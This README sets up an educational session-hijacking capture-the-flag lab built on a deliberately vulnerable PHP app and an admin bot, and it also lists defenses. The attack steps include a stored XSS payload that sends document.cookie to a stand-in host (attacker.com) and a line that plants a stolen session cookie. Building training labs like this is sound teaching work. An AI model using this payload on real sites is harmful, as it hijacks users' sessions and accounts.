
# Session Hijacking Lab - performed in march 2025 for M.tech cybersecurity MIT WPU

# **🛡️ Session Hijacking Lab – CTF Challenge**  
🚀 **Learn how to exploit and secure session hijacking vulnerabilities in web applications!**  
This lab provides a **hands-on environment** for testing **session hijacking, XSS attacks, and insecure session management** in a **controlled setup**.  

---

## **📌 Lab Overview**  
- **Target Web App**: A **deliberately vulnerable PHP application**  
- **Attacks Demonstrated**: Session Hijacking, XSS, Insecure Cookies  
- **Defenses Implemented**: Secure Cookies, CSP, Session Expiry, Regeneration  
- **Automation**: Admin bot automatically visits **comments** and gets hijacked  
- **CTF Challenge**: Users must **capture flags** by hijacking admin sessions  

---

## **🖥️ System Requirements**  
Before setting up, ensure you have:  
✅ **Linux Machine (Ubuntu/Debian recommended)**  
✅ **Apache, MySQL, PHP (LAMP stack)**  
✅ **Git** (for cloning the repository)  

---

## **🚀 Setup Instructions**  
### **1️⃣ Install Required Packages**  
Run the following commands to install the required software:  
```bash
sudo apt update && sudo apt install apache2 mysql-server php libapache2-mod-php php-mysql unzip git -y
```

Enable the **Apache and MySQL services**:  
```bash
sudo systemctl enable apache2 && sudo systemctl enable mysql
sudo systemctl start apache2 && sudo systemctl start mysql
```

---

### **2️⃣ Clone the Repository**
```bash
cd /var/www/html
sudo git clone https://github.com/YOUR_GITHUB_USERNAME/CTF-Labs.git
mv CTF-Labs/session-hijacking vulnapp
cd vulnapp
sudo chown -R www-data:www-data /var/www/html/vulnapp
```
🔹 **Replace** `YOUR_GITHUB_USERNAME` with your actual GitHub username.  

---

### **3️⃣ Configure MySQL Database**
#### **1️⃣ Log in to MySQL**  
```bash
sudo mysql -u root -p
```
(Enter your MySQL root password)

#### **2️⃣ Create the Database and User**
```sql
CREATE DATABASE vulnapp;
CREATE USER 'vulnuser'@'localhost' IDENTIFIED BY 'password123';
GRANT ALL PRIVILEGES ON vulnapp.* TO 'vulnuser'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```
🔹 **Replace `password123`** with a secure password.

---

### **4️⃣ Import the Lab Database**
```bash
sudo mysql -u vulnuser -p vulnapp < vulnapp.sql
```
✅ This will **create tables** for:  
- `users` – Stores user credentials and session info  
- `flags_pool` – Holds pre-generated flags  
- `flags` – Tracks submitted flags  
- `comments` – Stores user comments  
- `leaderboard` (optional) – Used in earlier versions  

---

### **5️⃣ Configure Apache**
Make sure Apache is **configured to serve PHP pages**:  
```bash
sudo nano /etc/apache2/sites-available/000-default.conf
```
Set **DocumentRoot**:
```
DocumentRoot /var/www/html/vulnapp
<Directory "/var/www/html/vulnapp">
    AllowOverride All
    Require all granted
</Directory>
```
Save and exit (`CTRL + X`, then `Y` and `Enter`).

Reload Apache:
```bash
sudo systemctl restart apache2
```

---

## **🛠️ Running the Lab**
### **1️⃣ Start the Web Application**
Visit:  
```bash
http://YOUR_IP/vulnapp
```
🔹 Find your IP with:
```bash
ip a | grep inet
```

### **2️⃣ Start the Admin Bot**
```bash
php /var/www/html/vulnapp/admin_bot.php
```
✅ The **admin bot** will now **visit the comments page every 5 seconds**, making it vulnerable to XSS.

---

## **🎯 Challenge: Capture the Flag (CTF)**
### **Attack Steps**
1️⃣ **Post an XSS payload** in the comments:
   ```html
   <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>
   ```
2️⃣ **Steal the admin’s session ID**.  
3️⃣ **Inject the stolen session ID** into your browser:
   ```js
   document.cookie="sessionid=stolen_admin_session";
   ```
4️⃣ **Access the admin page**, retrieve the flag, and submit it.  

---

## **🛡️ Security Fixes to Prevent Attacks**
| **Defense** | **Implementation** |
|------------|------------------|
| **HttpOnly & Secure Cookies** | `setcookie("sessionid", session_id(), ["secure" => true, "httponly" => true]);` |
| **Session Regeneration** | `session_regenerate_id(true);` |
| **CSP (Content Security Policy)** | `header("Content-Security-Policy: script-src 'self'");` |
| **Auto Logout on Inactivity** | `if (time() - $_SESSION['last_activity'] > 900) session_destroy();` |

---

## **🛠️ Reset the Lab for a New Challenge**
To **clear data** and start fresh:  
```sql
TRUNCATE TABLE comments;
TRUNCATE TABLE flags;
UPDATE users SET assigned_flag = NULL WHERE username = 'admin';
UPDATE flags_pool SET is_used = FALSE;
```

---

## **📌 Future Improvements**
✅ **More challenges** (CSRF, SQLi, OAuth Misconfigurations)  
✅ **Dockerization** for **easier deployment**  
✅ **More realistic scenarios** (phishing, token theft)  

---

## **📞 Need Help?**
Open an **issue on GitHub** or contact me at **saurabhkoravi01@gmail.com**.  


🚀 **Happy hacking & securing!** 🔥
